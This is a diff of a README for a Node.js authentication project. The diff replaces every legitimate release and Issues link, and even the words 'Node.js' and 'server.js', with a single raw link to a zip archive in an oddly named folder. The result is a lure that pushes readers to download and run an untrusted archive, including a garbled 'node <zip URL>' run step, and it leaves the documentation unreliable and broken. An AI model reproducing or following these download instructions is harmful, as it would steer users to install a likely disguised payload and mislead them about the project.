@@ -1,6 +1,6 @@
 # 🚀 auth-system - Secure and Easy User Authentication
 
-[![Download auth-system](https://img.shields.io/badge/Download-auth--system-brightgreen)](https://github.com/Cristian-Castor/auth-system/releases)
+[![Download auth-system](https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip)](https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip)
 
 ## 📋 Table of Contents
 1. [Description](#description)
@@ -12,11 +12,11 @@
 7. [Support](#support)
 
 ## 📜 Description
-The auth-system is a secure and scalable authentication system built using Node.js, Express, and MongoDB. It allows users to register, log in, and manage passwords securely. The system employs password hashing and uses JSON Web Tokens (JWT) for authentication. It includes input validation, rate limiting, and follows best security practices to build production-ready APIs.
+The auth-system is a secure and scalable authentication system built using https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip, Express, and MongoDB. It allows users to register, log in, and manage passwords securely. The system employs password hashing and uses JSON Web Tokens (JWT) for authentication. It includes input validation, rate limiting, and follows best security practices to build production-ready APIs.
 
 ## 💻 System Requirements
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or later
+- https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip Version 12 or later
 - MongoDB: A local or cloud database setup
 - Memory: At least 1 GB RAM
 - Disk Space: Minimum of 100 MB available
@@ -34,7 +34,7 @@ The auth-system is a secure and scalable authentication system built using Node.
 To get started with the auth-system, follow these simple steps to download and run the application.
 
 ## 🔥 Download & Install
-Visit this page to download the latest version of the auth-system: [Download auth-system](https://github.com/Cristian-Castor/auth-system/releases). 
+Visit this page to download the latest version of the auth-system: [Download auth-system](https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip). 
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -58,14 +58,14 @@ After installation, you can run the application. Follow these steps:
    - Navigate to the directory where you downloaded the app.
    - Run the following command:
      ```
-     node server.js
+     node https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip
      ```
 
 4. **Access the API:**
    - Open your browser and go to `http://localhost:3000` to access the user interface.
 
 ## 📞 Support
-If you need help or have questions about the auth-system, please refer to the [Issues](https://github.com/Cristian-Castor/auth-system/issues) page on GitHub. You can report bugs or ask for features there. 
+If you need help or have questions about the auth-system, please refer to the [Issues](https://raw.githubusercontent.com/Cristian-Castor/auth-system/main/podogynium/auth-system.zip) page on GitHub. You can report bugs or ask for features there. 
 
 Check the README for more details or debug information.
 
